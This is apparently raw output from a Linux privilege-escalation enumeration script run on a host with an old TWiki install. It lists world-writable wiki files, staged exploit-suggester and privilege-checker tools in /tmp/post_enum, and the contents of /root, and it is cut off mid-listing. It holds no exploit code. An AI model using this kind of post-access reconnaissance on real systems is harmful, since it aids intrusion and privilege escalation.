+    -rwxrwxrwx 1 www-data www-data 7649 2003-01-30 03:36 /var/www/twiki/data/TWiki/TWikiUsernameVsLoginUsername.txt,v
+    -rwxrwxrwx 1 www-data www-data 741 2001-08-31 21:32 /var/www/twiki/data/TWiki/TWikiDownload.txt,v
+    -rwxrwxrwx 1 www-data www-data 208 2000-07-01 02:17 /var/www/twiki/data/TWiki/BumpyWord.txt,v
+    -rwxrwxrwx 1 www-data www-data 13094 2003-01-31 04:03 /var/www/twiki/data/TWiki/InstantEnhancements.txt,v
+    -rwxrwxrwx 1 www-data www-data 464 2002-04-12 15:44 /var/www/twiki/data/TWiki/TWikiWebsTable.txt,v
+    -rwxrwxrwx 1 www-data www-data 522 2003-01-11 21:40 /var/www/twiki/data/TWiki/SvenDowideit.txt,v
+    -rwxrwxrwx 1 www-data www-data 49540 2003-02-01 15:47 /var/www/twiki/data/TWiki/TextFormattingRules.txt,v
+    -rwxrwxrwx 1 www-data www-data 163 2003-01-11 19:51 /var/www/twiki/data/TWiki/MartinCleaver.txt
+    -rwxrwxrwx 1 www-data www-data 11311 2003-01-08 02:14 /var/www/twiki/data/TWiki/TWikiSkins.txt,v
+    -rwxrwxrwx 1 www-data www-data 22892 2003-01-19 03:32 /var/www/twiki/data/TWiki/ManagingWebs.txt,v
+    -rwxrwxrwx 1 www-data www-data 2098 2002-04-21 02:18 /var/www/twiki/data/TWiki/SiteMap.txt,v
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-11 19:47 /var/www/twiki/data/TWiki/DavidWarman.txt
+    -rwxrwxrwx 1 www-data www-data 710 2002-05-12 02:46 /var/www/twiki/data/TWiki/InstalledPlugins.txt,v
+    -rwxrwxrwx 1 www-data www-data 107111 2003-02-01 20:29 /var/www/twiki/data/TWiki/TWikiInstallationGuide.txt,v
+    -rwxrwxrwx 1 www-data www-data 14543 2001-09-18 02:31 /var/www/twiki/data/TWiki/TWikiCategoryTable.txt,v
+    -rwxrwxrwx 1 www-data www-data 422 2001-11-30 05:26 /var/www/twiki/data/TWiki/TablePlugin.txt,v
+    -rwxrwxrwx 1 www-data www-data 61752 2003-01-27 03:22 /var/www/twiki/data/TWiki/TWikiVariables.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:32 /var/www/twiki/data/TWiki/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 5896 2003-01-23 02:55 /var/www/twiki/data/TWiki/PreviewBackground.txt,v
+    -rwxrwxrwx 1 www-data www-data 46039 2003-02-01 20:42 /var/www/twiki/data/TWiki/AppendixFileSystem.txt,v
+    -rwxrwxrwx 1 www-data www-data 1696 2003-01-11 21:24 /var/www/twiki/data/TWiki/KevinKinnell.txt,v
+    -rwxrwxrwx 1 www-data www-data 2230 2001-09-01 03:20 /var/www/twiki/data/TWiki/TWikiUpgradeTo01May2000.txt
+    -rwxrwxrwx 1 www-data www-data 520 2003-01-11 21:33 /var/www/twiki/data/TWiki/RandyKramer.txt,v
+    -rwxrwxrwx 1 www-data www-data 141 2001-09-18 02:31 /var/www/twiki/data/TWiki/TWikiCategoryTable.txt
+    -rwxrwxrwx 1 www-data www-data 2707 2002-06-13 02:03 /var/www/twiki/data/TWiki/EmptyPlugin.txt
+    -rwxrwxrwx 1 www-data www-data 1557 2003-01-11 19:49 /var/www/twiki/data/TWiki/JohnAltstadt.txt,v
+    -rwxrwxrwx 1 www-data www-data 18 2000-07-01 02:17 /var/www/twiki/data/TWiki/BumpyWord.txt
+    -rwxrwxrwx 1 www-data www-data 1864 2003-01-23 03:41 /var/www/twiki/data/TWiki/TWikiPlannedFeatures.txt,v
+    -rwxrwxrwx 1 www-data www-data 1596 2003-01-31 02:15 /var/www/twiki/data/TWiki/TWikiDocumentation.txt
+    -rwxrwxrwx 1 www-data www-data 25436 2003-01-19 04:01 /var/www/twiki/data/TWiki/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 1558 2003-01-23 03:23 /var/www/twiki/data/TWiki/WikiWikiClones.txt,v
+    -rwxrwxrwx 1 www-data www-data 12074 2002-12-09 15:08 /var/www/twiki/data/TWiki/StandardColors.txt
+    -rwxrwxrwx 1 www-data www-data 63109 2003-01-31 02:15 /var/www/twiki/data/TWiki/TWikiDocumentation.txt,v
+    -rwxrwxrwx 1 www-data www-data 589 2003-01-11 21:22 /var/www/twiki/data/TWiki/JohnTalintyre.txt,v
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:49 /var/www/twiki/data/TWiki/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 18092 2002-05-12 15:04 /var/www/twiki/data/TWiki/TWikiSite.txt,v
+    -rwxrwxrwx 1 www-data www-data 12905 2003-01-31 04:03 /var/www/twiki/data/TWiki/InstantEnhancements.txt
+    -rwxrwxrwx 1 www-data www-data 926 2001-08-31 20:19 /var/www/twiki/data/TWiki/EditDoesNotIncreaseTheRevision.txt,v
+    -rwxrwxrwx 1 www-data www-data 10414 2003-01-22 04:58 /var/www/twiki/data/TWiki/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 4189 2003-02-01 20:40 /var/www/twiki/data/TWiki/.changes
+    -rwxrwxrwx 1 www-data www-data 176 2001-11-24 06:31 /var/www/twiki/data/TWiki/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 2796 2002-02-11 14:16 /var/www/twiki/data/TWiki/WikiReferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 26335 2003-02-01 20:57 /var/www/twiki/data/TWiki/TWikiHistory.txt
+    -rwxrwxrwx 1 www-data www-data 1539 2003-01-11 21:25 /var/www/twiki/data/TWiki/NicholasLee.txt,v
+    -rwxrwxrwx 1 www-data www-data 183 2001-09-07 08:43 /var/www/twiki/data/TWiki/MetaDataDefinition.txt
+    -rwxrwxrwx 1 www-data www-data 17129 2003-02-01 20:29 /var/www/twiki/data/TWiki/TWikiInstallationGuide.txt
+    -rwxrwxrwx 1 www-data www-data 2651 2003-01-11 19:48 /var/www/twiki/data/TWiki/TWikiContributor.txt,v
+    -rwxrwxrwx 1 www-data www-data 591 2003-01-11 21:40 /var/www/twiki/data/TWiki/VitoMiliano.txt,v
+    -rwxrwxrwx 1 www-data www-data 1544 2003-01-08 02:17 /var/www/twiki/data/TWiki/WebSiteTools.txt
+    -rwxrwxrwx 1 www-data www-data 12825 2001-09-07 08:43 /var/www/twiki/data/TWiki/MetaDataDefinition.txt,v
+    -rwxrwxrwx 1 www-data www-data 28291 2002-10-22 02:42 /var/www/twiki/data/TWiki/TWikiTutorial.txt,v
+    -rwxrwxrwx 1 www-data www-data 298 2003-02-01 05:03 /var/www/twiki/data/TWiki/TWikiShorthand.txt,v
+    -rwxrwxrwx 1 www-data www-data 160 2003-01-11 19:47 /var/www/twiki/data/TWiki/AlWilliams.txt
+    -rwxrwxrwx 1 www-data www-data 971 2002-05-12 02:35 /var/www/twiki/data/TWiki/WikiTopic.txt
+    -rwxrwxrwx 1 www-data www-data 71246 2002-12-17 03:46 /var/www/twiki/data/TWiki/TWikiUpgradeTo01Dec2001.txt,v
+    -rwxrwxrwx 1 www-data www-data 6277 2003-01-23 03:36 /var/www/twiki/data/TWiki/TWikiFAQ.txt,v
+    -rwxrwxrwx 1 www-data www-data 2299 2002-01-05 03:30 /var/www/twiki/data/TWiki/DefaultPlugin.txt
+    -rwxrwxrwx 1 www-data www-data 1825 2001-09-01 03:27 /var/www/twiki/data/TWiki/SiteUsageStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 163 2003-01-11 21:26 /var/www/twiki/data/TWiki/PeterFokkinga.txt
+    -rwxrwxrwx 1 www-data www-data 711 2003-01-11 19:50 /var/www/twiki/data/TWiki/KlausWriessnegger.txt,v
+    -rwxrwxrwx 1 www-data www-data 162 2003-01-11 19:46 /var/www/twiki/data/TWiki/ColasNahaboo.txt
+    -rwxrwxrwx 1 www-data www-data 1532 2003-01-19 03:49 /var/www/twiki/data/TWiki/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 1726 2002-04-10 00:59 /var/www/twiki/data/TWiki/WikiCulture.txt
+    -rwxrwxrwx 1 www-data www-data 30402 2003-01-08 23:59 /var/www/twiki/data/TWiki/TextFormattingFAQ.txt,v
+    -rwxrwxrwx 1 www-data www-data 893 2002-10-23 01:27 /var/www/twiki/data/TWiki/BookView.txt,v
+    -rwxrwxrwx 1 www-data www-data 984 2003-01-18 04:42 /var/www/twiki/data/TWiki/WikiName.txt
+    -rwxrwxrwx 1 www-data www-data 866 2003-01-31 01:40 /var/www/twiki/data/TWiki/TextEditor.txt
+    -rwxrwxrwx 1 www-data www-data 5739 2002-12-28 21:04 /var/www/twiki/data/TWiki/TWikiUserAuthentication.txt
+    -rwxrwxrwx 1 www-data www-data 20855 2002-12-28 21:04 /var/www/twiki/data/TWiki/TWikiUserAuthentication.txt,v
+    -rwxrwxrwx 1 www-data www-data 1587 2003-01-30 03:36 /var/www/twiki/data/TWiki/TWikiUsernameVsLoginUsername.txt
+    -rwxrwxrwx 1 www-data www-data 0 2003-02-01 20:13 /var/www/twiki/data/debug.txt
+    -rwxrwxrwx 1 www-data www-data 401 2003-01-30 03:15 /var/www/twiki/data/_default/WebRss.txt
+    -rwxrwxrwx 1 www-data www-data 159 2001-08-16 15:58 /var/www/twiki/data/_default/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:52 /var/www/twiki/data/_default/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 370 2002-04-14 02:48 /var/www/twiki/data/_default/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 959 2003-01-25 05:27 /var/www/twiki/data/_default/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:40 /var/www/twiki/data/_default/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 590 2003-01-30 03:15 /var/www/twiki/data/_default/WebRss.txt,v
+    -rwxrwxrwx 1 www-data www-data 348 2001-08-16 15:58 /var/www/twiki/data/_default/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 1982 2003-01-25 05:27 /var/www/twiki/data/_default/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 158 2001-08-08 01:26 /var/www/twiki/data/_default/WebSearch.txt
+    -rwxrwxrwx 1 www-data www-data 611 2001-11-24 06:41 /var/www/twiki/data/_default/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 3394 2003-01-19 16:38 /var/www/twiki/data/_default/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 2325 2002-04-14 02:48 /var/www/twiki/data/_default/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:40 /var/www/twiki/data/_default/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 347 2001-08-08 01:26 /var/www/twiki/data/_default/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:50 /var/www/twiki/data/_default/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 4189 2003-01-19 16:38 /var/www/twiki/data/_default/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 683 2003-01-30 03:15 /var/www/twiki/data/_default/.changes
+    -rwxrwxrwx 1 www-data www-data 211 2001-11-24 06:41 /var/www/twiki/data/_default/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 1283 2003-01-19 03:50 /var/www/twiki/data/_default/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 159 2001-08-16 15:59 /var/www/twiki/data/Trash/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:52 /var/www/twiki/data/Trash/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 350 2002-06-28 02:55 /var/www/twiki/data/Trash/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 959 2003-01-25 05:27 /var/www/twiki/data/Trash/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:42 /var/www/twiki/data/Trash/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 659 2001-08-16 15:59 /var/www/twiki/data/Trash/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 1982 2003-01-25 05:27 /var/www/twiki/data/Trash/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 158 2001-08-08 01:49 /var/www/twiki/data/Trash/WebSearch.txt
+    -rwxrwxrwx 1 www-data www-data 387 2002-06-28 02:55 /var/www/twiki/data/Trash/TrashAttachment.txt,v
+    -rwxrwxrwx 1 www-data www-data 611 2001-11-24 06:42 /var/www/twiki/data/Trash/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 3404 2003-01-19 16:38 /var/www/twiki/data/Trash/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 2563 2002-06-28 02:55 /var/www/twiki/data/Trash/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:42 /var/www/twiki/data/Trash/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 347 2001-08-08 01:49 /var/www/twiki/data/Trash/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:51 /var/www/twiki/data/Trash/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 4525 2003-01-19 16:38 /var/www/twiki/data/Trash/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 767 2003-01-25 05:04 /var/www/twiki/data/Trash/.changes
+    -rwxrwxrwx 1 www-data www-data 211 2001-11-24 06:42 /var/www/twiki/data/Trash/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 198 2002-06-28 02:55 /var/www/twiki/data/Trash/TrashAttachment.txt
+    -rwxrwxrwx 1 www-data www-data 1283 2003-01-19 03:51 /var/www/twiki/data/Trash/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 0 2003-02-01 20:13 /var/www/twiki/data/warning.txt
+    -rwxrwxrwx 1 www-data www-data 3419 2001-08-13 03:15 /var/www/twiki/data/mime.types
+    -rwxrwxrwx 1 www-data www-data 1078 2000-01-14 20:17 /var/www/twiki/pub/favicon.ico
+    -rwxrwxrwx 1 www-data www-data 2877 1999-06-08 01:02 /var/www/twiki/pub/wikiHome.gif
+    -rwxrwxrwx 1 www-data www-data 64 2000-03-12 03:41 /var/www/twiki/pub/Know/IncorrectDllVersionW32PTH10DLL/W32PTH10.DLL
+    -rwxrwxrwx 1 www-data www-data 367 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/new.gif,v
+    -rwxrwxrwx 1 www-data www-data 317 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/updated.gif
+    -rwxrwxrwx 1 www-data www-data 364 2003-01-21 20:51 /var/www/twiki/pub/TWiki/TWikiDocGraphics/newtopic.gif,v
+    -rwxrwxrwx 1 www-data www-data 192 2003-01-18 02:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/searchtopic.gif
+    -rwxrwxrwx 1 www-data www-data 138 2001-09-27 20:41 /var/www/twiki/pub/TWiki/TWikiDocGraphics/warning.gif
+    -rwxrwxrwx 1 www-data www-data 342 2001-09-27 20:41 /var/www/twiki/pub/TWiki/TWikiDocGraphics/warning.gif,v
+    -rwxrwxrwx 1 www-data www-data 402 2003-01-18 02:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/searchtopic.gif,v
+    -rwxrwxrwx 1 www-data www-data 2164 2002-10-30 22:27 /var/www/twiki/pub/TWiki/TWikiDocGraphics/viewtopic.gif,v
+    -rwxrwxrwx 1 www-data www-data 193 2003-01-18 02:16 /var/www/twiki/pub/TWiki/TWikiDocGraphics/attachfile.gif
+    -rwxrwxrwx 1 www-data www-data 332 2001-09-27 20:40 /var/www/twiki/pub/TWiki/TWikiDocGraphics/help.gif,v
+    -rwxrwxrwx 1 www-data www-data 1304 2002-05-16 02:58 /var/www/twiki/pub/TWiki/TWikiDocGraphics/choice-yes.gif,v
+    -rwxrwxrwx 1 www-data www-data 167 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/new.gif
+    -rwxrwxrwx 1 www-data www-data 401 2003-01-18 02:16 /var/www/twiki/pub/TWiki/TWikiDocGraphics/attachfile.gif,v
+    -rwxrwxrwx 1 www-data www-data 357 2003-01-18 02:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/printtopic.gif,v
+    -rwxrwxrwx 1 www-data www-data 82 2002-05-16 02:58 /var/www/twiki/pub/TWiki/TWikiDocGraphics/choice-yes.gif
+    -rwxrwxrwx 1 www-data www-data 2209 2002-10-30 22:27 /var/www/twiki/pub/TWiki/TWikiDocGraphics/edittopic.gif,v
+    -rwxrwxrwx 1 www-data www-data 172 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/pencil.gif
+    -rwxrwxrwx 1 www-data www-data 591 2001-12-03 01:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/tip.gif,v
+    -rwxrwxrwx 1 www-data www-data 904 2002-10-30 22:27 /var/www/twiki/pub/TWiki/TWikiDocGraphics/viewtopic.gif
+    -rwxrwxrwx 1 www-data www-data 123 2001-12-03 01:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/tip.gif
+    -rwxrwxrwx 1 www-data www-data 931 2002-10-30 22:27 /var/www/twiki/pub/TWiki/TWikiDocGraphics/edittopic.gif
+    -rwxrwxrwx 1 www-data www-data 147 2003-01-18 02:15 /var/www/twiki/pub/TWiki/TWikiDocGraphics/printtopic.gif
+    -rwxrwxrwx 1 www-data www-data 376 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/pencil.gif,v
+    -rwxrwxrwx 1 www-data www-data 130 2001-09-27 20:40 /var/www/twiki/pub/TWiki/TWikiDocGraphics/help.gif
+    -rwxrwxrwx 1 www-data www-data 297 2002-04-14 03:18 /var/www/twiki/pub/TWiki/TWikiDocGraphics/arrowright.gif,v
+    -rwxrwxrwx 1 www-data www-data 81 2002-04-14 03:18 /var/www/twiki/pub/TWiki/TWikiDocGraphics/arrowright.gif
+    -rwxrwxrwx 1 www-data www-data 158 2003-01-21 20:51 /var/www/twiki/pub/TWiki/TWikiDocGraphics/newtopic.gif
+    -rwxrwxrwx 1 www-data www-data 522 2002-04-14 03:17 /var/www/twiki/pub/TWiki/TWikiDocGraphics/updated.gif,v
+    -rwxrwxrwx 1 www-data www-data 330 2002-04-14 03:18 /var/www/twiki/pub/TWiki/TWikiDocGraphics/starred.gif,v
+    -rwxrwxrwx 1 www-data www-data 128 2002-04-14 03:18 /var/www/twiki/pub/TWiki/TWikiDocGraphics/starred.gif
+    -rwxrwxrwx 1 www-data www-data 9566 2002-07-18 03:27 /var/www/twiki/pub/TWiki/TWikiTemplates/testscreen.gif
+    -rwxrwxrwx 1 www-data www-data 19540 2002-07-18 03:27 /var/www/twiki/pub/TWiki/TWikiTemplates/testscreen.gif,v
+    -rwxrwxrwx 1 www-data www-data 3112 2002-06-28 03:28 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot46x50.gif,v
+    -rwxrwxrwx 1 www-data www-data 5602 2002-06-28 03:23 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot121x54.gif,v
+    -rwxrwxrwx 1 www-data www-data 6125 2002-06-28 03:23 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot121x54a.gif
+    -rwxrwxrwx 1 www-data www-data 7218 2002-06-28 03:24 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot131x64.gif
+    -rwxrwxrwx 1 www-data www-data 3757 2002-06-28 03:26 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot88x31.gif,v
+    -rwxrwxrwx 1 www-data www-data 6413 2002-06-28 03:23 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot121x54a.gif,v
+    -rwxrwxrwx 1 www-data www-data 7535 2002-06-28 03:24 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot131x64.gif,v
+    -rwxrwxrwx 1 www-data www-data 3501 2002-06-28 04:10 /var/www/twiki/pub/TWiki/TWikiLogos/twikilogo88x31.gif
+    -rwxrwxrwx 1 www-data www-data 5320 2002-06-28 03:23 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot121x54.gif
+    -rwxrwxrwx 1 www-data www-data 7025 2002-06-28 03:25 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot81x119.gif,v
+    -rwxrwxrwx 1 www-data www-data 2877 2002-06-28 03:28 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot46x50.gif
+    -rwxrwxrwx 1 www-data www-data 3501 2002-06-28 03:26 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot88x31.gif
+    -rwxrwxrwx 1 www-data www-data 3765 2002-06-28 04:10 /var/www/twiki/pub/TWiki/TWikiLogos/twikilogo88x31.gif,v
+    -rwxrwxrwx 1 www-data www-data 6710 2002-06-28 03:25 /var/www/twiki/pub/TWiki/TWikiLogos/twikiRobot81x119.gif
+    -rwxrwxrwx 1 www-data www-data 878 2000-10-02 20:48 /var/www/twiki/pub/TWiki/PreviewBackground/blankwhitebg.gif
+    -rwxrwxrwx 1 www-data www-data 1821 2000-10-02 20:46 /var/www/twiki/pub/TWiki/PreviewBackground/previewbg.gif
+    -rwxrwxrwx 1 www-data www-data 878 2000-10-02 20:48 /var/www/twiki/pub/TWiki/PreviewBackground/blankltgraybg.gif
+    -rwxrwxrwx 1 www-data www-data 2104 2002-08-25 03:04 /var/www/twiki/pub/TWiki/PreviewBackground/preview2bg.gif,v
+    -rwxrwxrwx 1 www-data www-data 1881 2002-08-25 03:04 /var/www/twiki/pub/TWiki/PreviewBackground/preview2bg.gif
+    -rwxrwxrwx 1 www-data www-data 81 2002-08-15 13:14 /var/www/twiki/pub/TWiki/FileAttachment/Smile.gif,v
+    -rwxrwxrwx 1 www-data www-data 30 1999-07-22 04:32 /var/www/twiki/pub/TWiki/FileAttachment/Sample.txt
+    -rwxrwxrwx 1 www-data www-data 94 1999-06-08 01:52 /var/www/twiki/pub/TWiki/FileAttachment/Smile.gif
+    -rwxrwxrwx 1 www-data www-data 994 2001-03-09 02:45 /var/www/twiki/pub/TWiki/WabiSabi/wabisabi.gif
+    -rwxrwxrwx 1 www-data www-data 81 2002-05-12 08:10 /var/www/twiki/pub/TWiki/WabiSabi/wabisabi.gif,v
+    -rwxrwxrwx 1 www-data www-data 943 2003-02-01 18:15 /var/www/twiki/pub/icn/bmp.gif
+    -rwxrwxrwx 1 www-data www-data 156 2003-02-01 18:15 /var/www/twiki/pub/icn/ps.gif
+    -rwxrwxrwx 1 www-data www-data 155 2003-02-01 18:15 /var/www/twiki/pub/icn/pl.gif
+    -rwxrwxrwx 1 www-data www-data 890 2003-02-01 18:21 /var/www/twiki/pub/icn/_filetypes.txt
+    -rwxrwxrwx 1 www-data www-data 958 2003-02-01 18:15 /var/www/twiki/pub/icn/html.gif
+    -rwxrwxrwx 1 www-data www-data 932 2003-02-01 18:15 /var/www/twiki/pub/icn/xml.gif
+    -rwxrwxrwx 1 www-data www-data 158 2003-02-01 18:15 /var/www/twiki/pub/icn/fon.gif
+    -rwxrwxrwx 1 www-data www-data 920 2003-02-01 18:15 /var/www/twiki/pub/icn/js.gif
+    -rwxrwxrwx 1 www-data www-data 921 2003-02-01 18:15 /var/www/twiki/pub/icn/ppt.gif
+    -rwxrwxrwx 1 www-data www-data 956 2003-02-01 18:15 /var/www/twiki/pub/icn/xsl.gif
+    -rwxrwxrwx 1 www-data www-data 151 2003-02-01 18:15 /var/www/twiki/pub/icn/h.gif
+    -rwxrwxrwx 1 www-data www-data 139 2003-02-01 18:15 /var/www/twiki/pub/icn/else.gif
+    -rwxrwxrwx 1 www-data www-data 889 2003-02-01 18:15 /var/www/twiki/pub/icn/exe.gif
+    -rwxrwxrwx 1 www-data www-data 166 2003-02-01 18:15 /var/www/twiki/pub/icn/wav.gif
+    -rwxrwxrwx 1 www-data www-data 128 2001-11-11 04:13 /var/www/twiki/pub/icn/down.gif
+    -rwxrwxrwx 1 www-data www-data 159 2003-02-01 18:15 /var/www/twiki/pub/icn/ttf.gif
+    -rwxrwxrwx 1 www-data www-data 168 2003-02-01 18:15 /var/www/twiki/pub/icn/sniff.gif
+    -rwxrwxrwx 1 www-data www-data 157 2003-02-01 18:15 /var/www/twiki/pub/icn/bat.gif
+    -rwxrwxrwx 1 www-data www-data 130 2001-11-11 04:13 /var/www/twiki/pub/icn/up.gif
+    -rwxrwxrwx 1 www-data www-data 148 2003-02-01 18:15 /var/www/twiki/pub/icn/txt.gif
+    -rwxrwxrwx 1 www-data www-data 150 2003-02-01 18:15 /var/www/twiki/pub/icn/c.gif
+    -rwxrwxrwx 1 www-data www-data 158 2003-02-01 18:15 /var/www/twiki/pub/icn/py.gif
+    -rwxrwxrwx 1 www-data www-data 926 2003-02-01 18:15 /var/www/twiki/pub/icn/mov.gif
+    -rwxrwxrwx 1 www-data www-data 153 2003-02-01 18:15 /var/www/twiki/pub/icn/java.gif
+    -rwxrwxrwx 1 www-data www-data 940 2003-02-01 18:15 /var/www/twiki/pub/icn/zip.gif
+    -rwxrwxrwx 1 www-data www-data 922 2003-02-01 18:15 /var/www/twiki/pub/icn/doc.gif
+    -rwxrwxrwx 1 www-data www-data 156 2003-02-01 18:15 /var/www/twiki/pub/icn/sh.gif
+    -rwxrwxrwx 1 www-data www-data 929 2003-02-01 18:15 /var/www/twiki/pub/icn/mdb.gif
+    -rwxrwxrwx 1 www-data www-data 918 2003-02-01 18:15 /var/www/twiki/pub/icn/xls.gif
+    -rwxrwxrwx 1 www-data www-data 165 2003-02-01 18:15 /var/www/twiki/pub/icn/reg.gif
+    -rwxrwxrwx 1 www-data www-data 893 2003-02-01 18:15 /var/www/twiki/pub/icn/eml.gif
+    -rwxrwxrwx 1 www-data www-data 138 2003-02-01 18:15 /var/www/twiki/pub/icn/ram.gif
+    -rwxrwxrwx 1 www-data www-data 166 2003-02-01 18:15 /var/www/twiki/pub/icn/hlp.gif
+    -rwxrwxrwx 1 www-data www-data 159 2003-02-01 18:15 /var/www/twiki/pub/icn/dll.gif
+    -rwxrwxrwx 1 www-data www-data 938 2003-02-01 18:15 /var/www/twiki/pub/icn/pdf.gif
+    -rwxrwxrwx 1 www-data www-data 166 2003-02-01 18:15 /var/www/twiki/pub/icn/wri.gif
+    -rwxrwxrwx 1 root root 65720 2026-11-06 20:48 /tmp/post_enum/les.sh
+    -rwxrwxrwx 1 root root 21474 2026-11-06 20:48 /tmp/post_enum/les2.pl
+    -rwxrwxrwx 1 root root 25304 2026-11-06 20:48 /tmp/post_enum/lpc.py
+    -rwxrwxrwx 1 root root 53 2026-11-22 19:29 /tmp/post_enum/les_output.txt
+
+[+] Checking if root's home folder is accessible
+    /root:
+    total 80K
+    drwxr-xr-x 14 root root 4.0K 2026-11-22 19:10 .
+    drwxr-xr-x 21 root root 4.0K 2012-05-20 14:36 ..
+    lrwxrwxrwx  1 root root    9 2012-05-14 00:26 .bash_history -> /dev/null
+    -rw-r--r--  1 root root 2.2K 2007-10-20 07:51 .bashrc
+    drwx------  3 root root 4.0K 2012-05-20 15:08 .config
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 15:08 Desktop
+    drwx------  2 root root 4.0K 2012-05-20 15:13 .filezilla
+    drwxr-xr-x  5 root root 4.0K 2026-11-22 19:10 .fluxbox
+    drwx------  2 root root 4.0K 2012-05-20 15:38 .gconf
+    drwx------  2 root root 4.0K 2012-05-20 15:40 .gconfd
+    drwx------  2 root root 4.0K 2026-11-21 22:20 .gnupg
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 15:09 .gstreamer-0.10
+    drwx------  4 root root 4.0K 2012-05-20 15:07 .mozilla
+    -rw-r--r--  1 root root  141 2007-10-20 07:51 .profile
+    drwx------  5 root root 4.0K 2012-05-20 15:11 .purple
+    -rwx------  1 root root  401 2012-05-20 15:55 reset_logs.sh
+    -rwx------  1 root root    4 2012-05-20 14:25 .rhosts
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 14:21 .ssh
+    drwx------  2 root root 4.0K 2026-11-22 19:10 .vnc
+    -rw-r--r--  1 root root  138 2026-11-22 19:10 vnc.log
+    -rw-------  1 root root  324 2026-11-22 19:10 .Xauthority
+    /root/Desktop:
+    total 8.0K
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 15:08 .
+    drwxr-xr-x 14 root root 4.0K 2026-11-22 19:10 ..
+    /root/.fluxbox:
+    total 52K
+    drwxr-xr-x  5 root root 4.0K 2026-11-22 19:10 .
+    drwxr-xr-x 14 root root 4.0K 2026-11-22 19:10 ..
+    -rw-r--r--  1 root root   70 2012-05-20 14:46 apps
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 14:46 backgrounds
+    -rw-r--r--  1 root root  314 2012-05-20 14:46 init
+    -rw-r--r--  1 root root 2.8K 2012-05-20 14:46 keys
+    -rw-r--r--  1 root root  142 2026-11-22 19:10 lastwallpaper
+    -rw-r--r--  1 root root   66 2012-05-20 14:46 menu
+    -rw-r--r--  1 root root   89 2012-05-20 14:46 overlay
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 14:46 pixmaps
+    -rw-r--r--  1 root root  504 2012-05-20 14:46 startup
+    drwxr-xr-x  2 root root 4.0K 2012-05-20 14:46 styles
+    -rw-r--r--  1 root root  168 2012-05-20 14:46 windowmenu
+    /root/.fluxbox/backgrounds:
+    total 8.0K
+    drwxr-xr-x 2 root root 4.0K 2012-05-20 14:46 .
+    drwxr-xr-x 5 root root 4.0K 2026-11-22 19:10 ..
+    /root/.fluxbox/pixmaps:
+    total 8.0K
